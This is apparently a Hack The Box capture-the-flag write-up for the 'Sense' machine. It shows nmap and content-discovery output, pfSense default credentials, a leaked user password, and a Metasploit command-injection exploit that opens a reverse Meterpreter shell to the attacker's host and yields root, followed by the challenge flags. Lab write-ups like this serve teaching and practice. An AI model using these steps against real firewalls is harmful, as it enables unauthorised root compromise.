---

title: 🟢 HTB - Sense
author: Acivik
date: 2025-01-24 15:00:00 +0300 
categories: [CTF, Hack The Box]
tags: [hackthebox, ctf, hacking, writeup, Sense, walkthrough, easy, linux]

---

![https://i.ibb.co/KNWDvQB/Sense.png](https://i.ibb.co/KNWDvQB/Sense.png)

---

# <span style="color:#AA0E1C"><b># Reconnaissance</b></span>

## <span style="color:#0096FF">Nmap</span>

nmap detected 2 open TCP ports: 80 (HTTP) and 443 (HTTPS)

```bash
root@kali:~/HTB/sense# nmap -p- 10.10.10.60 --min-rate 10000 --open -sVC -oA nmapout
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-15 10:09 UTC
Nmap scan report for 10.10.10.60 (10.10.10.60)
Host is up (0.076s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
|_http-server-header: lighttpd/1.4.35
443/tcp open  ssl/http lighttpd 1.4.35
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_http-server-header: lighttpd/1.4.35
|_http-title: Login
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.44 seconds
root@kali:~/HTB/sense#
```

port 80 redirects to HTTPS

# <span style="color:#AA0E1C"><b># Enumeration</b></span>

## <span style="color:#0096FF">WebSite</span>

There is a login page 

![https://i.ibb.co/pnjDTrc/Ekran-g-r-nt-s-2025-01-15-131247.png](https://i.ibb.co/pnjDTrc/Ekran-g-r-nt-s-2025-01-15-131247.png)

 default credentials for pfsense `admin:pfsense`

### <span style="color:#FFC300">Content Discovery</span>

![https://i.ibb.co/6DRnNPq/Ekran-g-r-nt-s-2025-01-15-163012.png](https://i.ibb.co/6DRnNPq/Ekran-g-r-nt-s-2025-01-15-163012.png)

We discovered many files.

There is a credential in this file `/system-users.txt`

```bash
####Support ticket###

Please create the following user

username: Rohit
password: company defaults
```

`rohit:pfsense`

# <span style="color:#AA0E1C"><b># Foothold: Shell as root</b></span>

![https://i.ibb.co/k5BXNfK/Ekran-g-r-nt-s-2025-01-15-164153.png](https://i.ibb.co/k5BXNfK/Ekran-g-r-nt-s-2025-01-15-164153.png)

PfSense is a FreeBSD-based firewall distribution.

I’ll check vulnerabilities of pfsense

```bash
root@kali:~/walkthrough# searchsploit pfsense graph
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
pfSense - 'status_graph.php?if' Cross-Site Scripting                                                                                                                            | hardware/remote/35070.txt
pfSense 2 Beta 4 - 'graph.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                                    | php/remote/34985.txt
pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection                                                                                                                  | php/webapps/43560.py
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
(tools) root@kali:~/walkthrough#
```

I exploited it with Metasploit and gained a root shell.

```bash
msf6 exploit(unix/http/pfsense_graph_injection_exec) > set LHOST tun0
LHOST => 10.10.14.23
msf6 exploit(unix/http/pfsense_graph_injection_exec) > set RHOSTS 10.10.10.60
RHOSTS => 10.10.10.60
msf6 exploit(unix/http/pfsense_graph_injection_exec) > set USERNAME rohit
USERNAME => rohit
msf6 exploit(unix/http/pfsense_graph_injection_exec) > run

[*] Started reverse TCP handler on 10.10.14.23:4444 
[*] Detected pfSense 2.1.3-RELEASE, uploading intial payload
[*] Payload uploaded successfully, executing
[*] Sending stage (39927 bytes) to 10.10.10.60
[+] Deleted TQyFd
[*] Meterpreter session 1 opened (10.10.14.23:4444 -> 10.10.10.60:52304) at 2025-01-15 13:38:06 +0000

meterpreter > shell
Process 67808 created.
Channel 0 created.
id
uid=0(root) gid=0(wheel) groups=0(wheel)
cat /root/root.txt
d08c32a5d4f8c8b10e76eb51a69f1a86
ls /home/	
.snap
rohit
cat /home/rohit/user.txt
8721327cc232073b40d27d9c17e7348b
```